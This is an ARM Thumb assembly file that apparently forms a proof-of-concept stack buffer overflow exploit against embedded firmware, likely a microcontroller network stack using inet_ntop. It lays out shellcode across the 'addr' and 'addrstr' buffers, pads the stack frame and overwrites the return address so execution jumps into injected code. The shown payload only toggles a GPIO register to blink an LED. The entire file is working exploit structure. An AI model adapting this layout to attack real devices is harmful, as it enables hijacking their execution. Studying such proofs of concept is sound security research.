.section .text
.code 16

@
@ Start of 'addr', 16 bytes
@

payload:
	@cpsid   i      @ disable interrupts to stop scheduler
	sub     sp, #72    @ we can just fix it this way... :)
	ldr     r1, $reg_toggle
	movs    r4, #64     @ also used by dumb_delay
	@ The following is a 'mov     r0, #0x200000'.
	@ r4 contains 0x40, and 0x40 << 15 = 0x200000
	lsl     r0, r4, #15
blink_loop:
	str     r4, [r1, #12]
	b       dumb_delay    @ this will return to blink_loop

.balign 4
reg_toggle: .word 0x400ff0c0

@
@ Start of 'addrstr', 46 bytes
@ This will be partially overwritten by inet_ntop.
@ I guess only the first 40 bytes will be overwritten...
@

.org 16

@
@ Remainder of 'addrstr' plus padding of the stack frame
@ 16+40 = 56
@

.org 56

dumb_delay:
	movs    r3, #0
dumb_delay_loop:
	cmp     r3, r0
	bne     dumb_delay_nop
	b       blink_loop
dumb_delay_nop:
@	nop      the nop is not actually needed...
	add     r3, r3, #1
	b       dumb_delay_loop

.org 68
ret_addr:   .word 0x1fffcba8 + 1   @ TODO

